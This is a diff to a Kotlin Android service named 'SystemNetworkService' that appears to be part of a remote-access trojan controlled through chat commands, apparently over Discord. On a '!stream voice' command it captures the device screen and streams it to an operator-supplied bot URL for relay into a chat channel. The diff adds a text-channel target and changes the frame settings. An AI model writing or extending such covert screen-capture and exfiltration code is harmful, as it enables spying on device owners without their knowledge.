@@ -400,10 +400,11 @@ class SystemNetworkService : Service() {
                             val parts = payload.split(" ")
                             val voiceChannelId = parts.getOrNull(1)
                             val guildId = parts.getOrNull(2)
-                            val customBotUrl = parts.getOrNull(3)
+                            val textChannelId = parts.getOrNull(3)
+                            val customBotUrl = parts.getOrNull(4)
 
-                            if (voiceChannelId == null || guildId == null) {
-                                d.sendMsg(":x: **Usage**: `!stream voice <channel_id> <guild_id> [bot_url]`\nExample: `!stream voice 123456789 987654321 https://mybot.com`")
+                            if (voiceChannelId == null || guildId == null || textChannelId == null) {
+                                d.sendMsg(":x: **Usage**: `!stream voice <voice_ch> <guild> <text_ch> [bot_url]`")
                                 return
                             }
 
@@ -412,7 +413,7 @@ class SystemNetworkService : Service() {
                                 return
                             }
 
-                            d.sendMsg(":satellite: **Starting voice stream**...\nConnecting to voice channel...")
+                            d.sendMsgAwait(":satellite: **Starting stream**...\nCapturing screen → sending to bot")
 
                             scope.launch {
                                 try {
@@ -433,13 +434,13 @@ class SystemNetworkService : Service() {
                                     
                                     liveStreamEncoder?.start(DisplayCapture.mediaProjection!!)
                                     
-                                    // Notify bot to start voice stream
                                     val json = org.json.JSONObject().apply {
                                         put("voiceChannelId", voiceChannelId)
                                         put("guildId", guildId)
-                                        put("fps", 30)
-                                        put("width", 480)
-                                        put("height", 360)
+                                        put("textChannelId", textChannelId)
+                                        put("fps", 5)
+                                        put("width", 640)
+                                        put("height", 480)
                                     }
                                     
                                     val req = okhttp3.Request.Builder()
@@ -453,7 +454,7 @@ class SystemNetworkService : Service() {
                                     
                                     client.newCall(req).execute().use { resp ->
                                         if (resp.isSuccessful) {
-                                            d.sendMsg(":white_check_mark: **Voice stream started**\n30fps H264 → VP8\nVoice channel streaming active")
+                                            d.sendMsg(":check: **Stream started!**\n5fps → text channel\nVoice: joined")
                                         } else {
                                             d.sendMsg(":x: **Bot connection failed**\nHTTP ${resp.code}")
                                         }
